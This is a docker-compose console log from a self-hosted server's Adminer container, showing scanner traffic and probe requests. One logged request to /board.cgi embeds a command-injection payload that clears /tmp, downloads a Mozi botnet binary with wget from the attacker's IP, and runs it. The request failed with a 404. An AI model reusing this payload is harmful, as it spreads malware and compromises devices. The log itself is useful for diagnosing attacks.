Attaching to nginx_webserver, nginx_proxy_manager, fastapi_app, adminer, postgres_db, nodejs_app
[36madminer      |[0m [Tue Jul  9 17:03:42 2024] PHP 7.4.33 Development Server (http://[::]:8080) started
[36madminer      |[0m [Tue Jul  9 17:03:57 2024] [::ffff:165.154.172.87]:51842 Accepted
[36madminer      |[0m [Tue Jul  9 17:03:57 2024] [::ffff:165.154.172.87]:51842 Invalid request (Unsupported SSL request)
[36madminer      |[0m [Tue Jul  9 17:03:57 2024] [::ffff:165.154.172.87]:51842 Closing
[36madminer      |[0m [Tue Jul  9 17:03:58 2024] [::ffff:165.154.172.87]:51408 Accepted
[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:51408 Closed without sending a request; it was probably just an unused speculative preconnection
[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:51408 Closing
[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:48302 Accepted
[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:48302 [200]: GET /
[36madminer      |[0m [Tue Jul  9 17:04:08 2024] [::ffff:165.154.172.87]:48302 Closing
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48306 Accepted
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48306 [200]: GET /?file=favicon.ico&version=4.8.1
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48306 Closing
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48314 Accepted
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48314 [404]: GET /robots.txt - No such file or directory
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48314 Closing
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48316 Accepted
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48316 [404]: GET /sitemap.xml - No such file or directory
[36madminer      |[0m [Tue Jul  9 17:04:09 2024] [::ffff:165.154.172.87]:48316 Closing
[36madminer      |[0m [Tue Jul  9 17:37:45 2024] [::ffff:117.252.160.19]:53890 Accepted
[36madminer      |[0m [Tue Jul  9 17:37:47 2024] [::ffff:117.252.160.19]:53890 [404]: GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://117.252.160.19:35600/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron - No such file or directory
[36madminer      |[0m [Tue Jul  9 17:37:47 2024] [::ffff:117.252.160.19]:53890 Closing
[36madminer      |[0m [Tue Jul  9 17:42:36 2024] [::ffff:212.102.57.145]:49718 Accepted
[36madminer      |[0m [Tue Jul  9 17:42:36 2024] [::ffff:212.102.57.145]:49718 [200]: CONNECT karlshochschule.de:443
[36madminer      |[0m [Tue Jul  9 17:42:36 2024] [::ffff:212.102.57.145]:49718 Closing
[36madminer      |[0m [Tue Jul  9 17:42:37 2024] [::ffff:212.102.57.145]:49728 Accepted
[36madminer      |[0m [Tue Jul  9 17:42:37 2024] [::ffff:212.102.57.145]:49728 [200]: CONNECT karlshochschule.de:443
[36madminer      |[0m [Tue Jul  9 17:42:37 2024] [::ffff:212.102.57.145]:49728 Closing
[36madminer      |[0m [Tue Jul  9 17:53:57 2024] [::ffff:88.214.193.144]:25174 Accepted
[36madminer      |[0m [Tue Jul  9 17:53:57 2024] [::ffff:88.214.193.144]:25174 Closed without sending a request; it was probably just an unused speculative preconnection
